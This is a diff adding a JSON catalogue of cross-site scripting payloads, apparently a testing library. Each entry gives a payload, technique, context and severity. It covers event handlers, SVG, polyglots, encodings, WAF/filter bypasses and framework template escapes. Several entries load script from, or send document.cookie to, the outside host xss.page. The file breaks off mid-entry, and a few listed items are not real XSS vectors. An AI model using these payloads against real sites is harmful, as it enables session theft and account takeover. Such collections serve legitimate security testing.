@@ -1,0 +1,1814 @@
+{
+  "version": "1.0",
+  "count": 150,
+  "generated": "2025-12-15T01:08:20.413Z",
+  "payloads": [
+    {
+      "id": 1,
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "technique": "script-tag",
+      "context": "html",
+      "description": "Classic XSS payload using script tag",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 2,
+      "payload": "<script>alert(document.domain)</script>",
+      "category": "basic",
+      "technique": "script-tag",
+      "context": "html",
+      "description": "Display current domain",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 3,
+      "payload": "<script src=\"//xss.page/xss.js\"></script>",
+      "category": "basic",
+      "technique": "script-tag",
+      "context": "html",
+      "description": "External script injection",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 4,
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "event-handler",
+      "technique": "onerror",
+      "context": "html",
+      "description": "Image error event handler",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 5,
+      "payload": "<body onload=alert(1)>",
+      "category": "event-handler",
+      "technique": "onload",
+      "context": "html",
+      "description": "Body onload event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 6,
+      "payload": "<svg onload=alert(1)>",
+      "category": "event-handler",
+      "technique": "onload",
+      "context": "html",
+      "description": "SVG onload event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 7,
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "category": "event-handler",
+      "technique": "onfocus",
+      "context": "html",
+      "description": "Input focus with autofocus",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 8,
+      "payload": "<marquee onstart=alert(1)>",
+      "category": "event-handler",
+      "technique": "onstart",
+      "context": "html",
+      "description": "Marquee onstart event",
+      "severity": "medium",
+      "browsers": [
+        "chrome",
+        "edge"
+      ]
+    },
+    {
+      "id": 9,
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "event-handler",
+      "technique": "ontoggle",
+      "context": "html",
+      "description": "Details toggle event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 10,
+      "payload": "<svg><script>alert(1)</script></svg>",
+      "category": "svg",
+      "technique": "svg-script",
+      "context": "html",
+      "description": "Script inside SVG",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 11,
+      "payload": "<svg><animate onbegin=alert(1) attributeName=x>",
+      "category": "svg",
+      "technique": "svg-animate",
+      "context": "html",
+      "description": "SVG animate onbegin",
+      "severity": "high",
+      "browsers": [
+        "firefox",
+        "chrome"
+      ]
+    },
+    {
+      "id": 12,
+      "payload": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"0\" y=\"20\">XSS</text></a></svg>",
+      "category": "svg",
+      "technique": "svg-link",
+      "context": "html",
+      "description": "SVG link with JavaScript protocol",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 13,
+      "payload": "<video src=x onerror=alert(1)>",
+      "category": "html5",
+      "technique": "video",
+      "context": "html",
+      "description": "Video tag error event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 14,
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "html5",
+      "technique": "audio",
+      "context": "html",
+      "description": "Audio tag error event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 15,
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "html5",
+      "technique": "iframe",
+      "context": "html",
+      "description": "Iframe with JavaScript protocol",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 16,
+      "payload": "<object data=\"javascript:alert(1)\">",
+      "category": "html5",
+      "technique": "object",
+      "context": "html",
+      "description": "Object with JavaScript data",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 17,
+      "payload": "<embed src=\"javascript:alert(1)\">",
+      "category": "html5",
+      "technique": "embed",
+      "context": "html",
+      "description": "Embed with JavaScript source",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 18,
+      "payload": "'; alert(1); //",
+      "category": "javascript",
+      "technique": "string-break",
+      "context": "javascript",
+      "description": "Break out of JavaScript string",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 19,
+      "payload": "\"; alert(1); //",
+      "category": "javascript",
+      "technique": "string-break",
+      "context": "javascript",
+      "description": "Break out of double-quoted string",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 20,
+      "payload": "-alert(1)-",
+      "category": "javascript",
+      "technique": "arithmetic",
+      "context": "javascript",
+      "description": "Arithmetic operator injection",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 21,
+      "payload": "${alert(1)}",
+      "category": "javascript",
+      "technique": "template-literal",
+      "context": "javascript",
+      "description": "Template literal injection",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 22,
+      "payload": "javascript:alert(1)",
+      "category": "url",
+      "technique": "javascript-protocol",
+      "context": "url",
+      "description": "JavaScript protocol in href",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 23,
+      "payload": "data:text/html,<script>alert(1)</script>",
+      "category": "url",
+      "technique": "data-url",
+      "context": "url",
+      "description": "Data URL with HTML",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 24,
+      "payload": "\" onclick=\"alert(1)",
+      "category": "attribute",
+      "technique": "attribute-break",
+      "context": "attribute",
+      "description": "Break out of attribute to add event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 25,
+      "payload": "\" autofocus onfocus=\"alert(1)",
+      "category": "attribute",
+      "technique": "attribute-break",
+      "context": "attribute",
+      "description": "Attribute with autofocus trick",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 26,
+      "payload": "<scr<script>ipt>alert(1)</scr<script>ipt>",
+      "category": "bypass",
+      "technique": "nested-tags",
+      "context": "html",
+      "description": "Bypass tag stripping filters",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 27,
+      "payload": "<img src=x onerror=\"alert(1)\"",
+      "category": "bypass",
+      "technique": "unclosed-tag",
+      "context": "html",
+      "description": "Unclosed tag to bypass parsing",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 28,
+      "payload": "<img src=x oneRRor=alert(1)>",
+      "category": "bypass",
+      "technique": "case-variation",
+      "context": "html",
+      "description": "Case variation bypass",
+      "severity": "low",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 29,
+      "payload": "<img src=x onerror=alert`1`>",
+      "category": "bypass",
+      "technique": "template-literal",
+      "context": "html",
+      "description": "Template literal instead of parentheses",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 30,
+      "payload": "<svg/onload=alert(1)>",
+      "category": "bypass",
+      "technique": "slash-separator",
+      "context": "html",
+      "description": "Slash as attribute separator",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 31,
+      "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+      "category": "encoding",
+      "technique": "html-entities",
+      "context": "html",
+      "description": "HTML entity encoding",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 32,
+      "payload": "<img src=x onerror=\"\\u0061\\u006c\\u0065\\u0072\\u0074(1)\">",
+      "category": "encoding",
+      "technique": "unicode",
+      "context": "html",
+      "description": "Unicode escape sequences",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 33,
+      "payload": "<img src=x onerror=\"\\x61\\x6c\\x65\\x72\\x74(1)\">",
+      "category": "encoding",
+      "technique": "hex",
+      "context": "html",
+      "description": "Hex escape sequences",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 34,
+      "payload": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+      "category": "encoding",
+      "technique": "base64",
+      "context": "html",
+      "description": "Base64 encoded payload",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 35,
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//",
+      "category": "polyglot",
+      "technique": "multi-context",
+      "context": "multi",
+      "description": "XSS polyglot for multiple contexts",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 36,
+      "payload": "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\\" onmouseover=/*&lt;svg/*/onload=alert()//>",
+      "category": "polyglot",
+      "technique": "multi-context",
+      "context": "multi",
+      "description": "Another XSS polyglot",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 37,
+      "payload": "#<img src=x onerror=alert(1)>",
+      "category": "dom",
+      "technique": "hash-injection",
+      "context": "dom",
+      "description": "DOM-based via URL hash",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 38,
+      "payload": "?search=<script>alert(1)</script>",
+      "category": "dom",
+      "technique": "query-injection",
+      "context": "dom",
+      "description": "DOM-based via query parameter",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 39,
+      "payload": "<img src=x:alert(1) onerror=eval(src)>",
+      "category": "waf-bypass",
+      "technique": "eval-src",
+      "context": "html",
+      "description": "Bypass using eval with src attribute",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 40,
+      "payload": "<svg><script>alert&#40;1)</script>",
+      "category": "waf-bypass",
+      "technique": "entity-bypass",
+      "context": "html",
+      "description": "HTML entity in parentheses",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 41,
+      "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+      "category": "waf-bypass",
+      "technique": "fromCharCode",
+      "context": "html",
+      "description": "Obfuscation using fromCharCode",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 42,
+      "payload": "<link rel=\"import\" href=\"data:text/html,<script>alert(1)</script>\">",
+      "category": "advanced",
+      "technique": "link-import",
+      "context": "html",
+      "description": "HTML import with data URL",
+      "severity": "high",
+      "browsers": [
+        "chrome-old"
+      ]
+    },
+    {
+      "id": 43,
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+      "category": "advanced",
+      "technique": "meta-refresh",
+      "context": "html",
+      "description": "Meta refresh with JavaScript",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 44,
+      "payload": "<form action=\"javascript:alert(1)\"><input type=\"submit\">",
+      "category": "advanced",
+      "technique": "form-action",
+      "context": "html",
+      "description": "Form with JavaScript action",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 45,
+      "payload": "<button formaction=\"javascript:alert(1)\">X</button>",
+      "category": "advanced",
+      "technique": "formaction",
+      "context": "html",
+      "description": "Button formaction attribute",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 46,
+      "payload": "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
+      "category": "advanced",
+      "technique": "mathml",
+      "context": "html",
+      "description": "MathML XSS vector",
+      "severity": "medium",
+      "browsers": [
+        "firefox"
+      ]
+    },
+    {
+      "id": 47,
+      "payload": "<img src=x:alert(1) onerror=eval(src) alt=``,``>",
+      "category": "legacy",
+      "technique": "ie-quirks",
+      "context": "html",
+      "description": "IE-specific eval bypass",
+      "severity": "medium",
+      "browsers": [
+        "ie",
+        "edge-legacy"
+      ]
+    },
+    {
+      "id": 48,
+      "payload": "<style>@import'javascript:alert(1)';</style>",
+      "category": "legacy",
+      "technique": "css-import",
+      "context": "html",
+      "description": "CSS import with JavaScript (IE)",
+      "severity": "low",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 49,
+      "payload": "<img src onerror=\"fetch('//xss.page?'+document.cookie)\">",
+      "category": "modern",
+      "technique": "exfiltration",
+      "context": "html",
+      "description": "Cookie exfiltration using fetch",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 50,
+      "payload": "<img src onerror=\"navigator.sendBeacon('//xss.page',document.cookie)\">",
+      "category": "modern",
+      "technique": "beacon",
+      "context": "html",
+      "description": "Data exfiltration using sendBeacon",
+      "severity": "critical",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 51,
+      "payload": "<script>import('data:text/javascript,alert(1)')</script>",
+      "category": "modern",
+      "technique": "dynamic-import",
+      "context": "html",
+      "description": "Dynamic import with data URL",
+      "severity": "high",
+      "browsers": [
+        "modern"
+      ]
+    },
+    {
+      "id": 52,
+      "payload": "<iframe srcdoc=\"<script>parent.alert(1)</script>\">",
+      "category": "modern",
+      "technique": "srcdoc",
+      "context": "html",
+      "description": "Iframe srcdoc attribute",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 53,
+      "payload": "<select onfocus=alert(1) autofocus>",
+      "category": "event-handler",
+      "technique": "onfocus",
+      "context": "html",
+      "description": "Select element with autofocus",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 54,
+      "payload": "<textarea onfocus=alert(1) autofocus>",
+      "category": "event-handler",
+      "technique": "onfocus",
+      "context": "html",
+      "description": "Textarea with autofocus",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 55,
+      "payload": "<keygen onfocus=alert(1) autofocus>",
+      "category": "event-handler",
+      "technique": "onfocus",
+      "context": "html",
+      "description": "Keygen with autofocus (deprecated)",
+      "severity": "medium",
+      "browsers": [
+        "legacy"
+      ]
+    },
+    {
+      "id": 56,
+      "payload": "<video onloadstart=alert(1)><source>",
+      "category": "event-handler",
+      "technique": "onloadstart",
+      "context": "html",
+      "description": "Video loadstart event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 57,
+      "payload": "<audio onloadstart=alert(1)><source>",
+      "category": "event-handler",
+      "technique": "onloadstart",
+      "context": "html",
+      "description": "Audio loadstart event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 58,
+      "payload": "<body onpageshow=alert(1)>",
+      "category": "event-handler",
+      "technique": "onpageshow",
+      "context": "html",
+      "description": "Page show event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 59,
+      "payload": "<body onpagehide=alert(1)>",
+      "category": "event-handler",
+      "technique": "onpagehide",
+      "context": "html",
+      "description": "Page hide event",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 60,
+      "payload": "<body onbeforeunload=alert(1)>",
+      "category": "event-handler",
+      "technique": "onbeforeunload",
+      "context": "html",
+      "description": "Before unload event",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 61,
+      "payload": "<body onhashchange=alert(1)>",
+      "category": "event-handler",
+      "technique": "onhashchange",
+      "context": "html",
+      "description": "Hash change event",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 62,
+      "payload": "<body onpopstate=alert(1)>",
+      "category": "event-handler",
+      "technique": "onpopstate",
+      "context": "html",
+      "description": "Popstate event",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 63,
+      "payload": "<form onsubmit=alert(1)><input type=submit>",
+      "category": "event-handler",
+      "technique": "onsubmit",
+      "context": "html",
+      "description": "Form submit event",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 64,
+      "payload": "<input oninput=alert(1)>",
+      "category": "event-handler",
+      "technique": "oninput",
+      "context": "html",
+      "description": "Input event",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 65,
+      "payload": "<input onchange=alert(1)>",
+      "category": "event-handler",
+      "technique": "onchange",
+      "context": "html",
+      "description": "Change event",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 66,
+      "payload": "<svg><set attributeName=onmouseover to=alert(1)>",
+      "category": "svg",
+      "technique": "svg-set",
+      "context": "html",
+      "description": "SVG set with event",
+      "severity": "medium",
+      "browsers": [
+        "firefox"
+      ]
+    },
+    {
+      "id": 67,
+      "payload": "<svg><discard onbegin=alert(1)>",
+      "category": "svg",
+      "technique": "svg-discard",
+      "context": "html",
+      "description": "SVG discard element",
+      "severity": "medium",
+      "browsers": [
+        "chrome",
+        "firefox"
+      ]
+    },
+    {
+      "id": 68,
+      "payload": "<svg><foreignObject><body onload=alert(1)></foreignObject>",
+      "category": "svg",
+      "technique": "svg-foreignobject",
+      "context": "html",
+      "description": "SVG foreignObject with HTML",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 69,
+      "payload": "<svg><use href=\"data:image/svg+xml,<svg id=x><script>alert(1)</script></svg>#x\">",
+      "category": "svg",
+      "technique": "svg-use",
+      "context": "html",
+      "description": "SVG use with data URL",
+      "severity": "high",
+      "browsers": [
+        "chrome",
+        "firefox"
+      ]
+    },
+    {
+      "id": 70,
+      "payload": "<svg><title><script>alert(1)</script></title>",
+      "category": "svg",
+      "technique": "svg-title",
+      "context": "html",
+      "description": "SVG title with script",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 71,
+      "payload": "<style>*{background:url(\"javascript:alert(1)\")}</style>",
+      "category": "style",
+      "technique": "css-url",
+      "context": "html",
+      "description": "CSS background with JavaScript (IE)",
+      "severity": "low",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 72,
+      "payload": "<style>@import\"javascript:alert(1)\";</style>",
+      "category": "style",
+      "technique": "css-import",
+      "context": "html",
+      "description": "CSS import with JavaScript",
+      "severity": "low",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 73,
+      "payload": "<style>body{x:expression(alert(1))}</style>",
+      "category": "style",
+      "technique": "css-expression",
+      "context": "html",
+      "description": "CSS expression (IE)",
+      "severity": "low",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 74,
+      "payload": "<div style=\"background:url(javascript:alert(1))\">",
+      "category": "style",
+      "technique": "inline-style",
+      "context": "html",
+      "description": "Inline style with JavaScript (IE)",
+      "severity": "low",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 75,
+      "payload": "<link rel=stylesheet href=\"javascript:alert(1)\">",
+      "category": "style",
+      "technique": "link-stylesheet",
+      "context": "html",
+      "description": "Link stylesheet with JavaScript",
+      "severity": "medium",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 76,
+      "payload": "<math><mi xlink:href=\"data:x,<script>alert(1)</script>\">",
+      "category": "xml",
+      "technique": "mathml",
+      "context": "html",
+      "description": "MathML with data URL",
+      "severity": "medium",
+      "browsers": [
+        "firefox"
+      ]
+    },
+    {
+      "id": 77,
+      "payload": "<?xml version=\"1.0\"?><?xml-stylesheet type=\"text/xsl\" href=\"data:text/xml,<xsl:stylesheet version=\\\"1.0\\\" xmlns:xsl=\\\"http://www.w3.org/1999/XSL/Transform\\\"><xsl:template match=\\\"/\\\"><script>alert(1)</script></xsl:template></xsl:stylesheet>\"?>",
+      "category": "xml",
+      "technique": "xsl",
+      "context": "xml",
+      "description": "XML with XSL stylesheet",
+      "severity": "high",
+      "browsers": [
+        "firefox",
+        "ie"
+      ]
+    },
+    {
+      "id": 78,
+      "payload": "<xml><a xmlns:a=\"http://www.w3.org/1999/xhtml\"><a:body onload=\"alert(1)\"/>",
+      "category": "xml",
+      "technique": "xmlns",
+      "context": "html",
+      "description": "XML namespace injection",
+      "severity": "medium",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 79,
+      "payload": "<a href=\"vbscript:msgbox(1)\">Click</a>",
+      "category": "protocol",
+      "technique": "vbscript",
+      "context": "html",
+      "description": "VBScript protocol (IE)",
+      "severity": "medium",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 80,
+      "payload": "<a href=\"livescript:alert(1)\">Click</a>",
+      "category": "protocol",
+      "technique": "livescript",
+      "context": "html",
+      "description": "LiveScript protocol (legacy)",
+      "severity": "low",
+      "browsers": [
+        "netscape"
+      ]
+    },
+    {
+      "id": 81,
+      "payload": "<a href=\"mocha:alert(1)\">Click</a>",
+      "category": "protocol",
+      "technique": "mocha",
+      "context": "html",
+      "description": "Mocha protocol (legacy)",
+      "severity": "low",
+      "browsers": [
+        "netscape"
+      ]
+    },
+    {
+      "id": 82,
+      "payload": "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
+      "category": "waf-bypass",
+      "technique": "unicode-escape",
+      "context": "html",
+      "description": "Unicode escaped function name",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 83,
+      "payload": "<img src=x onerror=eval(atob(\"YWxlcnQoMSk=\"))>",
+      "category": "waf-bypass",
+      "technique": "base64-eval",
+      "context": "html",
+      "description": "Base64 encoded eval",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 84,
+      "payload": "<img src=x onerror=window[`al`+`ert`](1)>",
+      "category": "waf-bypass",
+      "technique": "string-concat",
+      "context": "html",
+      "description": "String concatenation bypass",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 85,
+      "payload": "<img src=x onerror=[1].find(alert)>",
+      "category": "waf-bypass",
+      "technique": "array-find",
+      "context": "html",
+      "description": "Array find method",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 86,
+      "payload": "<img src=x onerror=top[`al`+`ert`](1)>",
+      "category": "waf-bypass",
+      "technique": "top-window",
+      "context": "html",
+      "description": "Top window reference",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 87,
+      "payload": "<img src=x onerror=self[`al`+`ert`](1)>",
+      "category": "waf-bypass",
+      "technique": "self-window",
+      "context": "html",
+      "description": "Self window reference",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 88,
+      "payload": "<img src=x onerror=parent[`al`+`ert`](1)>",
+      "category": "waf-bypass",
+      "technique": "parent-window",
+      "context": "html",
+      "description": "Parent window reference",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 89,
+      "payload": "<img src=x onerror=frames[`al`+`ert`](1)>",
+      "category": "waf-bypass",
+      "technique": "frames-window",
+      "context": "html",
+      "description": "Frames window reference",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 90,
+      "payload": "<img src=x onerror=globalThis[`al`+`ert`](1)>",
+      "category": "waf-bypass",
+      "technique": "globalthis",
+      "context": "html",
+      "description": "GlobalThis reference",
+      "severity": "medium",
+      "browsers": [
+        "modern"
+      ]
+    },
+    {
+      "id": 91,
+      "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+      "category": "obfuscation",
+      "technique": "decimal-entities",
+      "context": "html",
+      "description": "Decimal HTML entities",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 92,
+      "payload": "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
+      "category": "obfuscation",
+      "technique": "hex-entities",
+      "context": "html",
+      "description": "Hexadecimal HTML entities",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 93,
+      "payload": "<img src=x onerror=\"&#0000097&#0000108&#0000101&#0000114&#0000116(1)\">",
+      "category": "obfuscation",
+      "technique": "padded-entities",
+      "context": "html",
+      "description": "Padded HTML entities",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 94,
+      "payload": "<IMG SRC=x ONERROR=ALERT(1)>",
+      "category": "obfuscation",
+      "technique": "uppercase",
+      "context": "html",
+      "description": "Uppercase tag and attribute",
+      "severity": "low",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 95,
+      "payload": "<ImG sRc=x OnErRoR=aLeRt(1)>",
+      "category": "obfuscation",
+      "technique": "mixedcase",
+      "context": "html",
+      "description": "Mixed case",
+      "severity": "low",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 96,
+      "payload": "<img\nsrc=x\nonerror=alert(1)>",
+      "category": "bypass",
+      "technique": "newline",
+      "context": "html",
+      "description": "Newline between attributes",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 97,
+      "payload": "<img\tsrc=x\tonerror=alert(1)>",
+      "category": "bypass",
+      "technique": "tab",
+      "context": "html",
+      "description": "Tab between attributes",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 98,
+      "payload": "<img/src=x/onerror=alert(1)>",
+      "category": "bypass",
+      "technique": "slash",
+      "context": "html",
+      "description": "Slash separator",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 99,
+      "payload": "<img src=x onerror=ale\\u0072t(1)>",
+      "category": "bypass",
+      "technique": "unicode-escape-partial",
+      "context": "html",
+      "description": "Partial Unicode escape",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 100,
+      "payload": "<img src=x onerror=al\\ert(1)>",
+      "category": "bypass",
+      "technique": "backslash",
+      "context": "html",
+      "description": "Backslash in function name",
+      "severity": "low",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 101,
+      "payload": "\"-alert(1)-\"",
+      "category": "javascript",
+      "technique": "string-context",
+      "context": "javascript",
+      "description": "Inside double quotes",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 102,
+      "payload": "'-alert(1)-'",
+      "category": "javascript",
+      "technique": "string-context",
+      "context": "javascript",
+      "description": "Inside single quotes",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 103,
+      "payload": "`-alert(1)-`",
+      "category": "javascript",
+      "technique": "template-literal",
+      "context": "javascript",
+      "description": "Inside template literal",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 104,
+      "payload": "};alert(1);//",
+      "category": "javascript",
+      "technique": "object-break",
+      "context": "javascript",
+      "description": "Break out of object",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 105,
+      "payload": "]);alert(1);//",
+      "category": "javascript",
+      "technique": "array-break",
+      "context": "javascript",
+      "description": "Break out of array",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 106,
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "category": "framework",
+      "technique": "angular-sandbox",
+      "context": "html",
+      "description": "AngularJS sandbox escape (old)",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 107,
+      "payload": "{{$on.constructor('alert(1)')()}}",
+      "category": "framework",
+      "technique": "angular-scope",
+      "context": "html",
+      "description": "AngularJS scope escape",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 108,
+      "payload": "<div ng-app ng-csp><input autofocus ng-focus=\"$event.view.alert(1)\">",
+      "category": "framework",
+      "technique": "angular-csp",
+      "context": "html",
+      "description": "AngularJS CSP bypass",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 109,
+      "payload": "{{_openBlock.constructor('alert(1)')()}}",
+      "category": "framework",
+      "technique": "vue-template",
+      "context": "html",
+      "description": "Vue.js template injection",
+      "severity": "high",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 110,
+      "payload": "<%= 7*7 %>",
+      "category": "framework",
+      "technique": "ejs-template",
+      "context": "html",
+      "description": "EJS template injection test",
+      "severity": "medium",
+      "browsers": [
+        "all"
+      ]
+    },
+    {
+      "id": 111,
+      "payload": "<marquee onstart=alert(1)>",
+      "category": "mobile",
+      "technique": "marquee",
+      "context": "html",
+      "description": "Marquee on mobile browsers",
+      "severity": "medium",
+      "browsers": [
+        "mobile-chrome",
+        "mobile-safari"
+      ]
+    },
+    {
+      "id": 112,
+      "payload": "<isindex type=image src=x onerror=alert(1)>",
+      "category": "mobile",
+      "technique": "isindex",
+      "context": "html",
+      "description": "Isindex with image type",
+      "severity": "low",
+      "browsers": [
+        "legacy"
+      ]
+    },
+    {
+      "id": 113,
+      "payload": "<bgsound src=javascript:alert(1)>",
+      "category": "advanced",
+      "technique": "bgsound",
+      "context": "html",
+      "description": "BGSound tag (IE)",
+      "severity": "medium",
+      "browsers": [
+        "ie"
+      ]
+    },
+    {
+      "id": 114,
+      "payload": "<blink>test</blink>",
+      "category": "advanced",
+      "technique": "blink",
+      "context": "html",
